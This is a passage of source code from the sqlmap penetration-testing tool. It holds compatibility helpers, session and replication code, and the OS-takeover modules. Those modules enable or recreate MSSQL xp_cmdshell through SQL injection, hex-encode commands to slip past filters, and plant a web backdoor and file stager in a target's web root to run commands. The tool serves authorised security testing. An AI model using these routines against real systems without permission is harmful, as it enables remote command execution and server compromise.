comment).\n        return (x / 30269.0 + y / 30307.0 + z / 30323.0) % 1.0\n\n    def getstate(self):\n        \"\"\"Return internal state; can be passed to setstate() later.\"\"\"\n        return self.VERSION, self._seed, self.gauss_next\n\n    def setstate(self, state):\n        \"\"\"Restore internal state from object returned by getstate().\"\"\"\n        version = state[0]\n        if version == 1:\n            version, self._seed, self.gauss_next = state\n        else:\n            raise ValueError(\"state with version %s passed to \"\n                             \"Random.setstate() of version %s\" %\n                             (version, self.VERSION))\n\n    def jumpahead(self, n):\n        \"\"\"Act as if n calls to random() were made, but quickly.\n\n        n is an int, greater than or equal to 0.\n\n        Example use:  If you have 2 threads and know that each will\n        consume no more than a million random numbers, create two Random\n        objects r1 and r2, then do\n            r2.setstate(r1.getstate())\n            r2.jumpahead(1000000)\n        Then r1 and r2 will use guaranteed-disjoint segments of the full\n        period.\n        \"\"\"\n\n        if n < 0:\n            raise ValueError(\"n must be >= 0\")\n        x, y, z = self._seed\n        x = int(x * pow(171, n, 30269)) % 30269\n        y = int(y * pow(172, n, 30307)) % 30307\n        z = int(z * pow(170, n, 30323)) % 30323\n        self._seed = x, y, z\n\n    def __whseed(self, x=0, y=0, z=0):\n        \"\"\"Set the Wichmann-Hill seed from (x, y, z).\n\n        These must be integers in the range [0, 256).\n        \"\"\"\n\n        if not type(x) == type(y) == type(z) == int:\n            raise TypeError('seeds must be integers')\n        if not (0 <= x < 256 and 0 <= y < 256 and 0 <= z < 256):\n            raise ValueError('seeds must be in range(0, 256)')\n        if 0 == x == y == z:\n            # Initialize from current time\n            t = int(time.time() * 256)\n            t = int((t & 0xffffff) ^ (t >> 24))\n            t, x = divmod(t, 256)\n            t, y = divmod(t, 256)\n            t, z = divmod(t, 256)\n        # Zero is a poor seed, so substitute 1\n        self._seed = (x or 1, y or 1, z or 1)\n\n        self.gauss_next = None\n\n    def whseed(self, a=None):\n        \"\"\"Seed from hashable object's hash code.\n\n        None or no argument seeds from current time.  It is not guaranteed\n        that objects with distinct hash codes lead to distinct internal\n        states.\n\n        This is obsolete, provided for compatibility with the seed routine\n        used prior to Python 2.1.  Use the .seed() method instead.\n        \"\"\"\n\n        if a is None:\n            self.__whseed()\n            return\n        a = hash(a)\n        a, x = divmod(a, 256)\n        a, y = divmod(a, 256)\n        a, z = divmod(a, 256)\n        x = (x + a) % 256 or 1\n        y = (y + a) % 256 or 1\n        z = (z + a) % 256 or 1\n        self.__whseed(x, y, z)\n\ndef patchHeaders(headers):\n    if headers is not None and not hasattr(headers, \"headers\"):\n        if isinstance(headers, dict):\n            class _(dict):\n                def __getitem__(self, key):\n                    for key_ in self:\n                        if key_.lower() == key.lower():\n                            return super(_, self).__getitem__(key_)\n\n                    raise KeyError(key)\n\n                def get(self, key, default=None):\n                    try:\n                        return self[key]\n                    except KeyError:\n                        return default\n\n            headers = _(headers)\n\n        headers.headers = [\"%s: %s\\r\\n\" % (header, headers[header]) for header in headers]\n\n    return headers\n\ndef cmp(a, b):\n    \"\"\"\n    >>> cmp(\"a\", \"b\")\n    -1\n    >>> cmp(2, 1)\n    1\n    \"\"\"\n\n    if a < b:\n        return -1\n    elif a > b:\n        return 1\n    else:\n        return 0\n\n# Reference: https://github.com/urllib3/urllib3/blob/master/src/urllib3/filepost.py\ndef choose_boundary():\n    \"\"\"\n    >>> len(choose_boundary()) == 32\n    True\n    \"\"\"\n\n    retval = \"\"\n\n    try:\n        retval = uuid.uuid4().hex\n    except AttributeError:\n        retval = \"\".join(random.sample(\"0123456789abcdef\", 1)[0] for _ in xrange(32))\n\n    return retval\n\n# Reference: http://python3porting.com/differences.html\ndef round(x, d=0):\n    \"\"\"\n    >>> round(2.0)\n    2.0\n    >>> round(2.5)\n    3.0\n    \"\"\"\n\n    p = 10 ** d\n    if x > 0:\n        return float(math.floor((x * p) + 0.5)) / p\n    else:\n        return float(math.ceil((x * p) - 0.5)) / p\n\n# Reference: https://code.activestate.com/recipes/576653-convert-a-cmp-function-to-a-key-function/\ndef cmp_to_key(mycmp):\n    \"\"\"Convert a cmp= function into a key= function\"\"\"\n    class K(object):\n        __slots__ = ['obj']\n\n        def __init__(self, obj, *args):\n            self.obj = obj\n\n        def __lt__(self, other):\n            return mycmp(self.obj, other.obj) < 0\n\n        def __gt__(self, other):\n            return mycmp(self.obj, other.obj) > 0\n\n        def __eq__(self, other):\n            return mycmp(self.obj, other.obj) == 0\n\n        def __le__(self, other):\n            return mycmp(self.obj, other.obj) <= 0\n\n        def __ge__(self, other):\n            return mycmp(self.obj, other.obj) >= 0\n\n        def __ne__(self, other):\n            return mycmp(self.obj, other.obj) != 0\n\n        def __hash__(self):\n            raise TypeError('hash not implemented')\n\n    return K\n\n# Note: patch for Python 2.6\nif not hasattr(functools, \"cmp_to_key\"):\n    functools.cmp_to_key = cmp_to_key\n\nif sys.version_info >= (3, 0):\n    xrange = range\n    buffer = memoryview\nelse:\n    xrange = xrange\n    buffer = buffer\n\ndef LooseVersion(version):\n    \"\"\"\n    >>> LooseVersion(\"1.0\") == LooseVersion(\"1.0\")\n    True\n    >>> LooseVersion(\"1.0.1\") > LooseVersion(\"1.0\")\n    True\n    >>> LooseVersion(\"1.0.1-\") == LooseVersion(\"1.0.1\")\n    True\n    >>> LooseVersion(\"1.0.11\") < LooseVersion(\"1.0.111\")\n    True\n    >>> LooseVersion(\"foobar\") > LooseVersion(\"1.0\")\n    False\n    >>> LooseVersion(\"1.0\") > LooseVersion(\"foobar\")\n    False\n    >>> LooseVersion(\"3.22-mysql\") == LooseVersion(\"3.22-mysql-ubuntu0.3\")\n    True\n    >>> LooseVersion(\"8.0.22-0ubuntu0.20.04.2\")\n    8.000022\n    \"\"\"\n\n    match = re.search(r\"\\A(\\d[\\d.]*)\", version or \"\")\n\n    if match:\n        result = 0\n        value = match.group(1)\n        weight = 1.0\n        for part in value.strip('.').split('.'):\n            if part.isdigit():\n                result += int(part) * weight\n            weight *= 1e-3\n    else:\n        result = float(\"NaN\")\n\n    return result\n", "lib/core/session.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import hashDBWrite\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import OS\nfrom lib.core.settings import SUPPORTED_DBMS\n\ndef setDbms(dbms):\n    \"\"\"\n    @param dbms: database management system to be set into the knowledge\n    base as fingerprint.\n    @type dbms: C{str}\n    \"\"\"\n\n    hashDBWrite(HASHDB_KEYS.DBMS, dbms)\n\n    _ = \"(%s)\" % ('|'.join(SUPPORTED_DBMS))\n    _ = re.search(r\"\\A%s( |\\Z)\" % _, dbms, re.I)\n\n    if _:\n        dbms = _.group(1)\n\n    Backend.setDbms(dbms)\n    if kb.resolutionDbms:\n        hashDBWrite(HASHDB_KEYS.DBMS, kb.resolutionDbms)\n\n    logger.info(\"the back-end DBMS is %s\" % Backend.getDbms())\n\ndef setOs():\n    \"\"\"\n    Example of kb.bannerFp dictionary:\n\n    {\n      'sp': set(['Service Pack 4']),\n      'dbmsVersion': '8.00.194',\n      'dbmsServicePack': '0',\n      'distrib': set(['2000']),\n      'dbmsRelease': '2000',\n      'type': set(['Windows'])\n    }\n    \"\"\"\n\n    infoMsg = \"\"\n\n    if not kb.bannerFp:\n        return\n\n    if \"type\" in kb.bannerFp:\n        Backend.setOs(Format.humanize(kb.bannerFp[\"type\"]))\n        infoMsg = \"the back-end DBMS operating system is %s\" % Backend.getOs()\n\n    if \"distrib\" in kb.bannerFp:\n        kb.osVersion = Format.humanize(kb.bannerFp[\"distrib\"])\n        infoMsg += \" %s\" % kb.osVersion\n\n    if \"sp\" in kb.bannerFp:\n        kb.osSP = int(Format.humanize(kb.bannerFp[\"sp\"]).replace(\"Service Pack \", \"\"))\n\n    elif \"sp\" not in kb.bannerFp and Backend.isOs(OS.WINDOWS):\n        kb.osSP = 0\n\n    if Backend.getOs() and kb.osVersion and kb.osSP:\n        infoMsg += \" Service Pack %d\" % kb.osSP\n\n    if infoMsg:\n        logger.info(infoMsg)\n\n    hashDBWrite(HASHDB_KEYS.OS, Backend.getOs())\n", "lib/core/defaults.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.datatype import AttribDict\n\n_defaults = {\n    \"csvDel\": ',',\n    \"timeSec\": 5,\n    \"googlePage\": 1,\n    \"verbose\": 1,\n    \"delay\": 0,\n    \"timeout\": 30,\n    \"retries\": 3,\n    \"csrfRetries\": 0,\n    \"safeFreq\": 0,\n    \"threads\": 1,\n    \"level\": 1,\n    \"risk\": 1,\n    \"dumpFormat\": \"CSV\",\n    \"tablePrefix\": \"sqlmap\",\n    \"technique\": \"BEUSTQ\",\n    \"torType\": \"SOCKS5\",\n}\n\ndefaults = AttribDict(_defaults)\n", "lib/core/replication.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport sqlite3\n\nfrom lib.core.common import cleanReplaceUnicode\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapGenericException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.utils.safe2bin import safechardecode\n\nclass Replication(object):\n    \"\"\"\n    This class holds all methods/classes used for database\n    replication purposes.\n    \"\"\"\n\n    def __init__(self, dbpath):\n        try:\n            self.dbpath = dbpath\n            self.connection = sqlite3.connect(dbpath)\n            self.connection.isolation_level = None\n            self.cursor = self.connection.cursor()\n        except sqlite3.OperationalError as ex:\n            errMsg = \"error occurred while opening a replication \"\n            errMsg += \"file '%s' ('%s')\" % (dbpath, getSafeExString(ex))\n            raise SqlmapConnectionException(errMsg)\n\n    class DataType(object):\n        \"\"\"\n        Using this class we define auxiliary objects\n        used for representing sqlite data types.\n        \"\"\"\n\n        def __init__(self, name):\n            self.name = name\n\n        def __str__(self):\n            return self.name\n\n        def __repr__(self):\n            return \"<DataType: %s>\" % self\n\n    class Table(object):\n        \"\"\"\n        This class defines methods used to manipulate table objects.\n        \"\"\"\n\n        def __init__(self, parent, name, columns=None, create=True, typeless=False):\n            self.parent = parent\n            self.name = unsafeSQLIdentificatorNaming(name)\n            self.columns = columns\n            if create:\n                try:\n                    self.execute('DROP TABLE IF EXISTS \"%s\"' % self.name)\n                    if not typeless:\n                        self.execute('CREATE TABLE \"%s\" (%s)' % (self.name, ','.join('\"%s\" %s' % (unsafeSQLIdentificatorNaming(colname), coltype) for colname, coltype in self.columns)))\n                    else:\n                        self.execute('CREATE TABLE \"%s\" (%s)' % (self.name, ','.join('\"%s\"' % unsafeSQLIdentificatorNaming(colname) for colname in self.columns)))\n                except Exception as ex:\n                    errMsg = \"problem occurred ('%s') while initializing the sqlite database \" % getSafeExString(ex, UNICODE_ENCODING)\n                    errMsg += \"located at '%s'\" % self.parent.dbpath\n                    raise SqlmapGenericException(errMsg)\n\n        def insert(self, values):\n            \"\"\"\n            This function is used for inserting row(s) into current table.\n            \"\"\"\n\n            if len(values) == len(self.columns):\n                self.execute('INSERT INTO \"%s\" VALUES (%s)' % (self.name, ','.join(['?'] * len(values))), safechardecode(values))\n            else:\n                errMsg = \"wrong number of columns used in replicating insert\"\n                raise SqlmapValueException(errMsg)\n\n        def execute(self, sql, parameters=None):\n            try:\n                try:\n                    self.parent.cursor.execute(sql, parameters or [])\n                except UnicodeError:\n                    self.parent.cursor.execute(sql, cleanReplaceUnicode(parameters or []))\n            except sqlite3.OperationalError as ex:\n                errMsg = \"problem occurred ('%s') while accessing sqlite database \" % getSafeExString(ex, UNICODE_ENCODING)\n                errMsg += \"located at '%s'. Please make sure that \" % self.parent.dbpath\n                errMsg += \"it's not used by some other program\"\n                raise SqlmapGenericException(errMsg)\n\n        def beginTransaction(self):\n            \"\"\"\n            Great speed improvement can be gained by using explicit transactions around multiple inserts.\n            Reference: http://stackoverflow.com/questions/4719836/python-and-sqlite3-adding-thousands-of-rows\n            \"\"\"\n            self.execute('BEGIN TRANSACTION')\n\n        def endTransaction(self):\n            self.execute('END TRANSACTION')\n\n        def select(self, condition=None):\n            \"\"\"\n            This function is used for selecting row(s) from current table.\n            \"\"\"\n            _ = 'SELECT * FROM %s' % self.name\n            if condition:\n                _ += 'WHERE %s' % condition\n            return self.execute(_)\n\n    def createTable(self, tblname, columns=None, typeless=False):\n        \"\"\"\n        This function creates Table instance with current connection settings.\n        \"\"\"\n        return Replication.Table(parent=self, name=tblname, columns=columns, typeless=typeless)\n\n    def __del__(self):\n        self.cursor.close()\n        self.connection.close()\n\n    # sqlite data types\n    NULL = DataType('NULL')\n    INTEGER = DataType('INTEGER')\n    REAL = DataType('REAL')\n    TEXT = DataType('TEXT')\n    BLOB = DataType('BLOB')\n", "lib/takeover/xp_cmdshell.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import flattenValue\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import wasLastResponseDelayed\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeHex\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.request import inject\n\nclass XP_cmdshell(object):\n    \"\"\"\n    This class defines methods to deal with Microsoft SQL Server\n    xp_cmdshell extended procedure for plugins.\n    \"\"\"\n\n    def __init__(self):\n        self.xpCmdshellStr = \"master..xp_cmdshell\"\n\n    def _xpCmdshellCreate(self):\n        cmd = \"\"\n\n        if not Backend.isVersionWithin((\"2000\",)):\n            logger.debug(\"activating sp_OACreate\")\n\n            cmd = getSQLSnippet(DBMS.MSSQL, \"activate_sp_oacreate\")\n            inject.goStacked(agent.runAsDBMSUser(cmd))\n\n        self._randStr = randomStr(lowercase=True)\n        self.xpCmdshellStr = \"master..new_xp_cmdshell\"\n\n        cmd = getSQLSnippet(DBMS.MSSQL, \"create_new_xp_cmdshell\", RANDSTR=self._randStr)\n\n        if not Backend.isVersionWithin((\"2000\",)):\n            cmd += \";RECONFIGURE WITH OVERRIDE\"\n\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n\n    def _xpCmdshellConfigure2005(self, mode):\n        debugMsg = \"configuring xp_cmdshell using sp_configure \"\n        debugMsg += \"stored procedure\"\n        logger.debug(debugMsg)\n\n        cmd = getSQLSnippet(DBMS.MSSQL, \"configure_xp_cmdshell\", ENABLE=str(mode))\n\n        return cmd\n\n    def _xpCmdshellConfigure2000(self, mode):\n        debugMsg = \"configuring xp_cmdshell using sp_addextendedproc \"\n        debugMsg += \"stored procedure\"\n        logger.debug(debugMsg)\n\n        if mode == 1:\n            cmd = getSQLSnippet(DBMS.MSSQL, \"enable_xp_cmdshell_2000\", ENABLE=str(mode))\n        else:\n            cmd = getSQLSnippet(DBMS.MSSQL, \"disable_xp_cmdshell_2000\", ENABLE=str(mode))\n\n        return cmd\n\n    def _xpCmdshellConfigure(self, mode):\n        if Backend.isVersionWithin((\"2000\",)):\n            cmd = self._xpCmdshellConfigure2000(mode)\n        else:\n            cmd = self._xpCmdshellConfigure2005(mode)\n\n        inject.goStacked(agent.runAsDBMSUser(cmd))\n\n    def _xpCmdshellCheck(self):\n        cmd = \"ping -n %d 127.0.0.1\" % (conf.timeSec * 2)\n        self.xpCmdshellExecCmd(cmd)\n\n        return wasLastResponseDelayed()\n\n    @stackedmethod\n    def _xpCmdshellTest(self):\n        threadData = getCurrentThreadData()\n        pushValue(threadData.disableStdOut)\n        threadData.disableStdOut = True\n\n        logger.info(\"testing if xp_cmdshell extended procedure is usable\")\n        output = self.xpCmdshellEvalCmd(\"echo 1\")\n\n        if output == \"1\":\n            logger.info(\"xp_cmdshell extended procedure is usable\")\n        elif isNoneValue(output) and conf.dbmsCred:\n            errMsg = \"it seems that the temporary directory ('%s') used for \" % self.getRemoteTempPath()\n            errMsg += \"storing console output within the back-end file system \"\n            errMsg += \"does not have writing permissions for the DBMS process. \"\n            errMsg += \"You are advised to manually adjust it with option \"\n            errMsg += \"'--tmp-path' or you won't be able to retrieve \"\n            errMsg += \"the command(s) output\"\n            logger.error(errMsg)\n        elif isNoneValue(output):\n            logger.error(\"unable to retrieve xp_cmdshell output\")\n        else:\n            logger.info(\"xp_cmdshell extended procedure is usable\")\n\n        threadData.disableStdOut = popValue()\n\n    def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):\n        echoedLines = []\n        cmd = \"\"\n        charCounter = 0\n        maxLen = 512\n\n        if isinstance(fileContent, (set, list, tuple)):\n            lines = fileContent\n        else:\n            lines = fileContent.split(\"\\n\")\n\n        for line in lines:\n            echoedLine = \"echo %s \" % line\n            echoedLine += \">> \\\"%s\\\\%s\\\"\" % (tmpPath, randDestFile)\n            echoedLines.append(echoedLine)\n\n        for echoedLine in echoedLines:\n            cmd += \"%s & \" % echoedLine\n            charCounter += len(echoedLine)\n\n            if charCounter >= maxLen:\n                self.xpCmdshellExecCmd(cmd.rstrip(\" & \"))\n\n                cmd = \"\"\n                charCounter = 0\n\n        if cmd:\n            self.xpCmdshellExecCmd(cmd.rstrip(\" & \"))\n\n    def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):\n        # When user provides DBMS credentials (with --dbms-cred) we need to\n        # redirect the command standard output to a temporary file in order\n        # to retrieve it afterwards\n        # NOTE: this does not need to be done when the command is 'del' to\n        # delete the temporary file\n        if conf.dbmsCred and insertIntoTable:\n            self.tmpFile = \"%s/tmpc%s.txt\" % (conf.tmpPath, randomStr(lowercase=True))\n            cmd = \"%s > \\\"%s\\\"\" % (cmd, self.tmpFile)\n\n        # Obfuscate the command to execute, also useful to bypass filters\n        # on single-quotes\n        self._randStr = randomStr(lowercase=True)\n        self._forgedCmd = \"DECLARE @%s VARCHAR(8000);\" % self._randStr\n\n        try:\n            self._forgedCmd += \"SET @%s=%s;\" % (self._randStr, \"0x%s\" % encodeHex(cmd, binary=False))\n        except UnicodeError:\n            self._forgedCmd += \"SET @%s='%s';\" % (self._randStr, cmd)\n\n        # Insert the command standard output into a support table,\n        # 'sqlmapoutput', except when DBMS credentials are provided because\n        # it does not work unfortunately, BULK INSERT needs to be used to\n        # retrieve the output when OPENROWSET is used hence the redirection\n        # to a temporary file from above\n        if insertIntoTable and not conf.dbmsCred:\n            self._forgedCmd += \"INSERT INTO %s(data) \" % insertIntoTable\n\n        self._forgedCmd += \"EXEC %s @%s\" % (self.xpCmdshellStr, self._randStr)\n\n        return agent.runAsDBMSUser(self._forgedCmd)\n\n    def xpCmdshellExecCmd(self, cmd, silent=False):\n        return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)\n\n    def xpCmdshellEvalCmd(self, cmd, first=None, last=None):\n        output = None\n\n        if conf.direct:\n            output = self.xpCmdshellExecCmd(cmd)\n\n            if output and isinstance(output, (list, tuple)):\n                new_output = \"\"\n\n                for line in output:\n                    if line == \"NULL\":\n                        new_output += \"\\n\"\n                    else:\n                        new_output += \"%s\\n\" % line.strip(\"\\r\")\n\n                output = new_output\n        else:\n            inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))\n\n            # When user provides DBMS credentials (with --dbms-cred), the\n            # command standard output is redirected to a temporary file\n            # The file needs to be copied to the support table,\n            # 'sqlmapoutput'\n            if conf.dbmsCred:\n                inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))\n                self.delRemoteFile(self.tmpFile)\n\n            query = \"SELECT %s FROM %s ORDER BY id\" % (self.tblField, self.cmdTblName)\n\n            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                output = inject.getValue(query, resumeValue=False, blind=False, time=False)\n\n            if (output is None) or len(output) == 0 or output[0] is None:\n                output = []\n                count = inject.getValue(\"SELECT COUNT(id) FROM %s\" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                if isNumPosStrValue(count):\n                    for index in getLimitRange(count):\n                        query = agent.limitQuery(index, query, self.tblField)\n                        output.append(inject.getValue(query, union=False, error=False, resumeValue=False))\n\n            inject.goStacked(\"DELETE FROM %s\" % self.cmdTblName)\n\n            if output and isListLike(output) and len(output) > 1:\n                _ = \"\"\n                lines = [line for line in flattenValue(output) if line is not None]\n\n                for i in xrange(len(lines)):\n                    line = lines[i] or \"\"\n                    if line is None or i in (0, len(lines) - 1) and not line.strip():\n                        continue\n                    _ += \"%s\\n\" % line\n\n                output = _.rstrip('\\n')\n\n        return output\n\n    def xpCmdshellInit(self):\n        if not kb.xpCmdshellAvailable:\n            infoMsg = \"checking if xp_cmdshell extended procedure is \"\n            infoMsg += \"available, please wait..\"\n            logger.info(infoMsg)\n\n            result = self._xpCmdshellCheck()\n\n            if result:\n                logger.info(\"xp_cmdshell extended procedure is available\")\n                kb.xpCmdshellAvailable = True\n\n            else:\n                message = \"xp_cmdshell extended procedure does not seem to \"\n                message += \"be available. Do you want sqlmap to try to \"\n                message += \"re-enable it? [Y/n] \"\n\n                if readInput(message, default='Y', boolean=True):\n                    self._xpCmdshellConfigure(1)\n\n                    if self._xpCmdshellCheck():\n                        logger.info(\"xp_cmdshell re-enabled successfully\")\n                        kb.xpCmdshellAvailable = True\n\n                    else:\n                        logger.warning(\"xp_cmdshell re-enabling failed\")\n\n                        logger.info(\"creating xp_cmdshell with sp_OACreate\")\n                        self._xpCmdshellConfigure(0)\n                        self._xpCmdshellCreate()\n\n                        if self._xpCmdshellCheck():\n                            logger.info(\"xp_cmdshell created successfully\")\n                            kb.xpCmdshellAvailable = True\n\n                        else:\n                            warnMsg = \"xp_cmdshell creation failed, probably \"\n                            warnMsg += \"because sp_OACreate is disabled\"\n                            logger.warning(warnMsg)\n\n            hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n\n            if not kb.xpCmdshellAvailable:\n                errMsg = \"unable to proceed without xp_cmdshell\"\n                raise SqlmapUnsupportedFeatureException(errMsg)\n\n        debugMsg = \"creating a support table to write commands standard \"\n        debugMsg += \"output to\"\n        logger.debug(debugMsg)\n\n        # TEXT can't be used here because in error technique you get:\n        # \"The text, ntext, and image data types cannot be compared or sorted\"\n        self.createSupportTbl(self.cmdTblName, self.tblField, \"NVARCHAR(4000)\")\n\n        self._xpCmdshellTest()\n", "lib/takeover/web.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport io\nimport os\nimport posixpath\nimport re\nimport tempfile\n\nfrom extra.cloak.cloak import decloak\nfrom lib.core.agent import agent\nfrom lib.core.common import arrayizeValue\nfrom lib.core.common import Backend\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import getAutoDirectories\nfrom lib.core.common import getManualDirectories\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import getTechnique\nfrom lib.core.common import getTechniqueData\nfrom lib.core.common import isDigit\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import isWindowsDriveLetterPath\nfrom lib.core.common import normalizePath\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import openFile\nfrom lib.core.common import parseFilePaths\nfrom lib.core.common import posixToNtSlashes\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeHex\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import OS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.enums import WEB_PLATFORM\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT\nfrom lib.core.settings import EVENTVALIDATION_REGEX\nfrom lib.core.settings import SHELL_RUNCMD_EXE_TAG\nfrom lib.core.settings import SHELL_WRITABLE_DIR_TAG\nfrom lib.core.settings import VIEWSTATE_REGEX\nfrom lib.request.connect import Connect as Request\nfrom thirdparty.six.moves import urllib as _urllib\n\nclass Web(object):\n    \"\"\"\n    This class defines web-oriented OS takeover functionalities for\n    plugins.\n    \"\"\"\n\n    def __init__(self):\n        self.webPlatform = None\n        self.webBaseUrl = None\n        self.webBackdoorUrl = None\n        self.webBackdoorFilePath = None\n        self.webStagerUrl = None\n        self.webStagerFilePath = None\n        self.webDirectory = None\n\n    def webBackdoorRunCmd(self, cmd):\n        if self.webBackdoorUrl is None:\n            return\n\n        output = None\n\n        if not cmd:\n            cmd = conf.osCmd\n\n        cmdUrl = \"%s?cmd=%s\" % (self.webBackdoorUrl, getUnicode(cmd))\n        page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)\n\n        if page is not None:\n            output = re.search(r\"<pre>(.+?)</pre>\", page, re.I | re.S)\n\n            if output:\n                output = output.group(1)\n\n        return output\n\n    def webUpload(self, destFileName, directory, stream=None, content=None, filepath=None):\n        if filepath is not None:\n            if filepath.endswith('_'):\n                content = decloak(filepath)  # cloaked file\n            else:\n                with openFile(filepath, \"rb\", encoding=None) as f:\n                    content = f.read()\n\n        if content is not None:\n            stream = io.BytesIO(getBytes(content))  # string content\n\n            # Reference: https://github.com/sqlmapproject/sqlmap/issues/3560\n            # Reference: https://stackoverflow.com/a/4677542\n            stream.seek(0, os.SEEK_END)\n            stream.len = stream.tell()\n            stream.seek(0, os.SEEK_SET)\n\n        return self._webFileStreamUpload(stream, destFileName, directory)\n\n    def _webFileStreamUpload(self, stream, destFileName, directory):\n        stream.seek(0)  # Rewind\n\n        try:\n            setattr(stream, \"name\", destFileName)\n        except TypeError:\n            pass\n\n        if self.webPlatform in getPublicTypeMembers(WEB_PLATFORM, True):\n            multipartParams = {\n                \"upload\": \"1\",\n                \"file\": stream,\n                \"uploadDir\": directory,\n            }\n\n            if self.webPlatform == WEB_PLATFORM.ASPX:\n                multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION\n                multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE\n\n            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)\n\n            if \"File uploaded\" not in (page or \"\"):\n                warnMsg = \"unable to upload the file through the web file \"\n                warnMsg += \"stager to '%s'\" % directory\n                logger.warning(warnMsg)\n                return False\n            else:\n                return True\n        else:\n            logger.error(\"sqlmap hasn't got a web backdoor nor a web file stager for %s\" % self.webPlatform)\n            return False\n\n    def _webFileInject(self, fileContent, fileName, directory):\n        outFile = posixpath.join(ntToPosixSlashes(directory), fileName)\n        uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\\\\\') if Backend.isOs(OS.WINDOWS) else directory)\n        query = \"\"\n\n        if isTechniqueAvailable(getTechnique()):\n            where = getTechniqueData().where\n\n            if where == PAYLOAD.WHERE.NEGATIVE:\n                randInt = randomInt()\n                query += \"OR %d=%d \" % (randInt, randInt)\n\n        query += getSQLSnippet(DBMS.MYSQL, \"write_file_limit\", OUTFILE=outFile, HEXSTRING=encodeHex(uplQuery, binary=False))\n        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)\n        payload = agent.payload(newValue=query)\n        page = Request.queryPage(payload)\n\n        return page\n\n    def webInit(self):\n        \"\"\"\n        This method is used to write a web backdoor (agent) on a writable\n        remote directory within the web server document root.\n        \"\"\"\n\n        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webPlatform is not None:\n            return\n\n        self.checkDbmsOs()\n\n        default = None\n        choices = list(getPublicTypeMembers(WEB_PLATFORM, True))\n\n        for ext in choices:\n            if conf.url.endswith(ext):\n                default = ext\n                break\n\n        if not default:\n            default = WEB_PLATFORM.ASP if Backend.isOs(OS.WINDOWS) else WEB_PLATFORM.PHP\n\n        message = \"which web application language does 